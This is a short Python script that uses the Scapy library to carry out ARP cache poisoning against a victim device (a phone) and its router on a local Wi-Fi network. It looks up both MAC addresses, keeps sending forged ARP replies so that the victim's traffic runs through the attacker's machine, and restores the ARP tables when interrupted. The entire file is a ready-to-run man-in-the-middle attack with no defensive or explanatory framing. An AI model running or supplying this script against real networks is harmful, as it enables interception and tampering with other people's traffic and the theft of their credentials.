from scapy.all import ARP, Ether, sendp, srp
import time
import sys

VICTIM_IP  = "192.168.1.20"   # Phone
GATEWAY_IP = "192.168.1.1"    # Router
IFACE      = "wlan0"

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 iface=IFACE, timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    print(f"[!] Could not get MAC for {ip}")
    sys.exit(1)

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Tell victim: "I am the gateway"
    sendp(Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip
    ), iface=IFACE, verbose=False)

    # Tell gateway: "I am the victim"
    sendp(Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip
    ), iface=IFACE, verbose=False)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Restore victim's ARP table
    sendp(Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    ), iface=IFACE, count=5, verbose=False)

    # Restore gateway's ARP table
    sendp(Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=victim_ip, hwsrc=victim_mac
    ), iface=IFACE, count=5, verbose=False)

print("[*] Resolving MACs...")
victim_mac  = get_mac(VICTIM_IP)
gateway_mac = get_mac(GATEWAY_IP)

print(f"[+] Victim  MAC : {victim_mac}")
print(f"[+] Gateway MAC : {gateway_mac}")
print(f"\n[*] Starting ARP poisoning. Ctrl+C to stop.\n")

try:
    while True:
        poison(VICTIM_IP, victim_mac, GATEWAY_IP, gateway_mac)
        print(f"[+] Poisoned — victim and gateway ARP caches updated")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Stopping attack. Restoring ARP tables...")
    restore(VICTIM_IP, victim_mac, GATEWAY_IP, gateway_mac)
    print("[*] Restored. Exiting.")
